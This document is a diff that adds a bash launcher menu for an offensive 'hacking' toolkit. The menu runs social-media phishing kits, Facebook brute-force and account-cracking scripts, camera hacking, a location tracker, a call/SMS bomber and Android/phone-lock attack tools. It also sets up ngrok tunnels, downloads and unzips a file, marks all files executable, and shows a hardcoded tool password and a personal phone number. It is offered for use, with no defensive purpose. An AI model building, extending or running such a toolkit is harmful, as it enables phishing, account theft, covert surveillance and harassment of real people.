@@ -1,0 +1,139 @@
+#!/usr/bin/env bash
+# sparkz
+# Coded by @sparkz-technology (Don't change, noob!)
+# Github: https://github.com/sparkz-technology/sparkz
+
+cp ngrok hack/tools/phish-all
+cp ngrok hack/tools/hackcam
+cp ngrok hack/tools/Target
+cp ngrok hack/tools/hacklock
+
+menu() {
+echo -e "\e[1;32m"
+printf "\n"
+printf "            \e[1;31m>>>\e[0m\e[1;92m Coded by\e[0m\e[1;77m  Rupesh \e[0m\e[1;31m<<<\e[0m\n"
+printf "            \e[1;31m>>>\e[0m\e[1;92m whatsapp number:\e[0m +9779809642422  \e[0m\e[1;31m<<<\e[0m\n"                                                 
+
+printf "\e[1;31m[\e[0m\e[1;77m01\e[1;31m]\e[0m\e[1;32m fish-all social media \e[0m\n"
+printf "\e[1;31m[\e[0m\e[1;77m02\e[1;31m]\e[0m\e[1;32m Z-phisher \e[0m\n"
+printf "\e[1;31m[\e[0m\e[1;77m03\e[1;31m]\e[0m\e[1;32m Fb-Group-Hacker \e[0m\n"
+printf "\e[1;31m[\e[0m\e[1;77m04\e[1;31m]\e[0m\e[1;32m Fb-Cracked-ID \e[0m\n"
+printf "\e[1;31m[\e[0m\e[1;77m05\e[1;31m]\e[0m\e[1;32m Fb hidden number/email shower \e[0m\n"
+printf "\e[1;31m[\e[0m\e[1;77m06\e[1;31m]\e[0m\e[1;32m Fsociety (specially for make wordlist) \e[0m\n"
+printf "\e[1;31m[\e[0m\e[1;77m07\e[1;31m]\e[0m\e[1;32m Fb-Hacker (brutforce) \e[0m\n"
+printf "\e[1;31m[\e[0m\e[1;77m08\e[1;31m]\e[0m\e[1;32m Location Tracker \e[0m\n"
+printf "\e[1;31m[\e[0m\e[1;77m09\e[1;31m]\e[0m\e[1;32m Camera hacking \e[0m\n"
+printf "\e[1;31m[\e[0m\e[1;77m10\e[1;31m]\e[0m\e[1;32m Call/SMS Boomber \e[0m\n"
+printf "\e[1;31m[\e[0m\e[1;77m11\e[1;31m]\e[0m\e[1;32m phone pattern hacker \e[0m\n"
+printf "\e[1;31m[\e[0m\e[1;77m12\e[1;31m]\e[0m\e[1;32m Lemon (android hacker) \e[0m\n"
+printf "\e[1;31m[\e[0m\e[1;77m13\e[1;31m]\e[0m\e[1;32m Termux Updater \e[0m\n"
+printf "\e[1;31m[\e[0m\e[1;77m14\e[1;31m]\e[0m\e[1;32m FBTOOL \e[0m\n"
+printf "\e[1;31m[\e[0m\e[1;77m15\e[1;31m]\e[0m\e[1;32m Termux banner \e[0m\n"
+printf "\e[1;31m[\e[0m\e[1;77m16\e[1;31m]\e[0m\e[1;32m CrackFb \e[0m\n"
+printf "\e[1;31m    \e[0m\e[1;32m username=Fb Cracker password= Kashi \e[0m\n"
+printf "\e[1;31m[\e[0m\e[1;77m17\e[1;31m]\e[0m\e[1;32m Fix ngrok all problems \e[0m\n"
+printf "\e[1;31m[\e[0m\e[1;77m00\e[1;31m]\e[0m\e[1;32m exit \e[0m\n"
+printf "\n" 
+read -p $'\e[1;92m[*] Choose an option:\e[0m\e[1;77m ' option
+
+if [[ $option == 9 || $option == 09 ]]; then
+cd hack/tools/hackcam/
+chmod +x *
+clear
+bash hackcam.sh
+elif [[ $option == 16 || $option == sixteen ]]; then
+cd
+cd CrackFb
+python2 Kashi.py
+elif [[ $option == 10 || $option == ten ]]; then
+cd hack/tools/TBomb/
+chmod +x *
+clear
+bash TBomb.sh
+elif [[ $option == 8 || $option == 08 ]]; then
+cd hack/tools/Target/
+chmod +x *
+clear
+bash Target.sh
+elif [[ $option == 15 || $option == fifteen ]]; then
+cd hack/tools/banner
+chmod +x *
+clear
+bash ban.sh
+elif [[ $option == 11 || $option == eleven ]]; then
+cd hack/tools/hacklock/
+chmod +x *
+clear
+bash hacklock.sh
+elif [[ $option == 13 || $option == thirteen ]]; then
+cd hack/tools/update termux
+chmod +x *
+clear
+bash req
+elif [[ $option == 14 || $option == fourteen ]]; then
+cd
+cd FBTOOL
+chmod +x *
+clear
+python2 fbtool.py
+elif [[ $option == 1 || $option == 01 ]]; then
+cd hack/tools/phish-all
+chmod +x *
+clear
+bash croot.sh
+elif [[ $option == 5 || $option == 05 ]]; then
+cd hack/tools/fbi
+chmod +x *
+clear
+python2 fbi.py
+elif [[ $option == 2 || $option == 02 ]]; then
+cd hack/tools/zphisher
+chmod +x *
+clear
+bash zphisher.sh
+elif [[ $option == 6 || $option == 06 ]]; then
+cd hack/tools/fsociety
+chmod +x *
+clear
+python2 fsociety.py
+
+elif [[ $option == 12 || $option == twelve ]]; then
+cd ..
+lemon
+elif [[ $option == 3 || $option == 03 ]]; then
+cd hack/tools/fb-group-hack
+chmod +x *
+clear
+python2 fb-group-hack.py
+elif [[ $option == 4 || $option == 04 ]]; then
+cd hack/tools/afgcrack
+chmod +x *
+clear
+python2 crack.py
+elif [[ $option == 7 || $option == 07 ]]; then
+cd hack/tools/fb-hacker
+chmod +x *
+clear
+python2 fb.py
+elif [[ $option == 17 || $option == seventeen ]]; then
+rm -rf Ngrok_Linux_Droid.zip
+rm -rf Ngrok_Linux_Droid.zip.1
+rm -rf Ngrok_Linux_Droid.zip.2
+rm -rf Ngrok_Linux_Droid.zip.3
+wget https://github.com/Linux-Droid/Ngrok/raw/master/Ngrok_Linux_Droid.zip
+unzip Ngrok_Linux_Droid.zip && rm -rf Ngrok_Linux_Droid.zip -y
+chmod +x *
+rm -rf Ngrok_Linux_Droid.zip
+rm -rf Ngrok_Linux_Droid.zip.1
+rm -rf Ngrok_Linux_Droid.zip.2
+rm -rf Ngrok_Linux_Droid.zip.3
+elif [[ $option  == 00 ]]; then
+exit 1
+else
+printf "\e[1;93m[\e[1;77m!\e[0m\e[1;93m] Invalid option!\e[0m"
+sleep 0.5
+clear
+menu
+fi
+}
+menu
